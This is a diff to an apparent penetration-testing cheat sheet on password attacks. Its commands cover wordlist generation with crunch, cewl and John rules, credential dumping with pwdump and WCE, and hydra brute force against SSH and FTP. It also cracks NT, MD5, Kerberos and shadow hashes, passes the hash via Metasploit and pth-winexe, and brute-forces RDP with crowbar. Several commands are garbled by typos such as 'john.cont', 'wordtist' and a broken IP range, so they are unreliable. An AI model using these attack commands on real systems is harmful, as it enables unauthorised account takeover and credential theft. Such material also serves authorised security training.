@@ -4,11 +4,13 @@
 - [Password hash cracking](#Password-hash-cracking)
 - [Pass the hash](#Pass-the-hash)
 - [SSH key cracking](#SSH-key-cracking)
+- [Remote Desktop Protocol Attack](#Remote-Desktop-Protocol-Attack]
 - [Usefull tools](#Tools)
  
-# Password generator
+## Wordlists
+Wordlists, sometimes referred to as dictionary files, are simply text files containing words for use as input to programs designed to test passwords.
 
-Crunch: 
+#### Crunch: 
   - is a wordlist generator where you can specify a standard character set or a character set you specify.
 
 - crunch 6 6 1234567890ABCDE -o <file.txt>
@@ -26,8 +28,25 @@ Crunch:
   - % numeric charset
   - ^ special char include space
   
-Cewl:
-- cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
+#### Cewl:
+```
+cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
+```
+#### John the Ripper (JTR)
+Use for generate custom wordlists and apply rule permutations.
+
+- Add a rule to the JTR configuration **(/etc/john/john.cont**
+
+To do th is, we must locate the [List.Rules:Wordlist] segment, We will begin this rule with the $ character, which tells John to append a character to the original
+word in our wordlist. Next, we specify the type of character we want to append, in our case we want any number between zero and nine $[0-9]. Finally, to append double-dig its, we will simply repeat the $[0-9] sequence.
+```
+$[0-9]$[0-9]
+```
+- Mutate our wordlist
+```
+john --wordtist=our-cewt-list.txt --rules --stdout > mutated.txt
+```
+
 ------------------------------------------------------------------------------------------------------------------------
 # Windows  
 
@@ -41,6 +60,7 @@ pwdump and fgdump inject a DLL containning the hash dumping code into the ***Loc
 - WCE
 - WCE can steal NTLM credentails from memory and dump clear text password
 ***- c:\> WCE -w ***
+
 ------------------------------------------------------------------------------------------------------------------------
 # Password cracking
 
@@ -61,6 +81,7 @@ hydra -P [password-file.txt] -v [victim_ip] snmp
 - SSH 
 ```
 hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh
+hydra -l [user_name] -P [password_file.txt] ssh://[victim_ip]
 ```
 - FTP 
 ```
@@ -78,12 +99,18 @@ Usefull flag
 ------------------------------------------------------------------------------------------------------------------------
 # Password hash cracking
 
-- Hash identifier
-```
-usage: 
+#### Hash identifier
 
+- hash-identifier
+```
 hash-identifier
 ```
+- hashid
+```
+hashid [hash]
+```
+#### Hash cracking
+
 - MD5
 ```
 john --format=raw-md5 --wordlist=rockyou.txt [hash.file]
@@ -112,8 +139,20 @@ john --wordlist=passwords_kerb.txt hashes.file
 
 hashcat -m 18200 --force -a 0 hashes.file passwords.txt
 ```
+- NT hashes
+```
+john hash.txt --format=NT
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+```
+- Linux based hashes with JTR
+```
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+john --rules --wordlist=/usr/share/wordtists/rockyou.txt unshadowed.txt
+```
+
 ------------------------------------------------------------------------------------------------------------------------
-# Pass the hash
+### Pass the hash
+Technique allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions
 
 - Dump the contents of local SAM file, which contains the hashed(NTLM) passwords for every local account on the machine
 ```
@@ -134,8 +173,13 @@ msf> set SMBPass e.g (e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd83
 msf> exploit
 ```
 
-------------------------------------------------------------------------------------------------------------------------
+#### pth-winexe
+To do this, we will use pth-winexe579 from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol
+```
+> pth-winexe -U [specifying the user name and hash (in UNC format)] //[victim_ip] command
+```
 
+------------------------------------------------------------------------------------------------------------------------
 # SSH key cracking
 
 #### Cracking encrypted private key
@@ -161,9 +205,30 @@ chmod 600 id_rsa
 ```
 
 #### Login with id_rsa
+- install crowbar
 ```
 ssh -i id_rsa user-name@<ip>
 ```
+
+- crowbar using
+```
+crowbar -b rdp -s 10.11.8.22/ 32 -u admin -c ~/password-fite.txt -n 1
+
+-b: protocol
+-s: target server
+-u: username
+-c: wordlist
+-n: number of threads
+```
+
+------------------------------------------------------------------------------------------------------------------------
+#### Remote Desktop Protocol Attack
+Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords
+- Install crowbar
+```
+sudo apt install crowbar
+```
+
 
 ------------------------------------------------------------------------------------------------------------------------
 # Tools
